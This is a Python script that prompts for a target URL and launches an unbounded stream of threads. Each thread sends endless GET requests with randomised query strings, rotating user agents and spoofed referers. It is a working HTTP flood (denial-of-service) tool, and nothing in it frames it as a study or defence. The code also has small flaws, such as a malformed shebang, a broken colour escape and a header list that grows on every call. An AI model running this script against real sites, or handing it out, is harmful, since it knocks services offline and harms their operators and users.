#!usr/bin/python
import os
import requests
import threading
import datetime
import sys
import random
import string
import colorama

# Colors
class bcolors:
    NBlack = "\033[38;5;0m  \033[0m"
    NRed = "\033[38;5;1m  \033[0m"
    NGreen = "\033[38;5;2m  \033[0m"
    NYellow = "\033[38;5;3m  \033[0m"
    NBlue = "\033[38;5;4m  \033[0m"
    NMagenta = "\033[38;5;5m  \033[0m"
    NCyan = "\033[38;5;6m  \033[0m"
    NWhite =  "\033[38;5;7m  \033[0m"
    BBlack = "\033[48;5;0m  \033[0m"
    BRed =  "\033[48;5;1m  \033[0m"
    BGreen = "\033[48;5;2m  \033[0m"
    BYellow = "\033[48;5;3m  \033[0m"
    BBlue = "\033[48;5;4m  \033[0m"
    BMagenta = "\033[48;5;5m  \033[0m"
    BCyan = "\033[48;5;6m  \033[0m"
    BWhite = "\033[48;5;7m  \033[0m"

 
if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")
    print("""

    
""")
url = input("\033[96mURL:  \033[0m").strip()
u = int(0)
headers = []
referer = [
    "https://github.com/",
    "https://google.it/",
    "https://facebook.com/",
    "https://alibaba.com/",
    "https://google.com/",
    "https://youtube.com",
    ]

def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
    return headers

def genstr(size):
    out_str = ''
    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str

class httpth1(threading.Thread):
    def run(self):
        global u
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                u += 1
                print("\033[48;5;1m\033[37m" +str(u)+ "\033[0m \033[37mrequests: \033[38;5;6mm" +(url)+ "\033[0m") 
            except requests.exceptions.ConnectionError:
                print("\033[48;5;3m\033[30" +(url)+ "\033[0m \033[31mrequests error!\033[0m")
                pass
            except requests.exceptions.InvalidSchema:
                print ("[REQUEST TIME OUT]")
                raise SystemExit()
            except ValueError:
                print ("[Check Your URL]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()
